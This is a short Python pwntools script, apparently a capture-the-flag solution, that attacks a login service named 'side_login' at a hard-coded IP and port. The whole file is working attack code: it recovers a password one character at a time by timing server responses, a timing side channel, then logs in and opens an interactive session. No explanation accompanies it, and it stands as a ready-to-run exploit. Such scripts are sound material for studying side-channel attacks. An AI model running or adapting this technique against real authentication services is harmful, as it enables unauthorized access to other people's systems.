from pwn import *
import time

#context.log_level = 'debug'

HOST = '167.99.129.209'
PORT = 10004

pwd = ''

r = remote(HOST, PORT) #process('./side_login')

def go():
	allx = []
	names = []
	global pwd
	print('[i] current: ' + pwd)
	for chrx in range(32, 126):
		c = chr(chrx)
		r.recvuntil('>')
		r.sendline('1337')
		r.recvuntil('ord:')
		a = time.time()
		r.send(pwd + c)
		resp = r.recvuntil('1.')
		b = time.time()
		allx.append(b-a)
		names.append(c)

		if(b-a >= (0.1)*(len(pwd)+1)):
			print('[+] Found char: ' + c)
			pwd += c
			return 1
	return 0
	
			
print('[*] bruteforcing...')

for x in range(4):
	e = 0
	while not e:
		e = go()
	

			
print('[+] Password = ' + pwd)

r.recvuntil('>')
r.sendline('1')
r.recvuntil('rd:')

#gdb.attach(r)
#pause()

r.send(pwd)

r.interactive()
r.close()
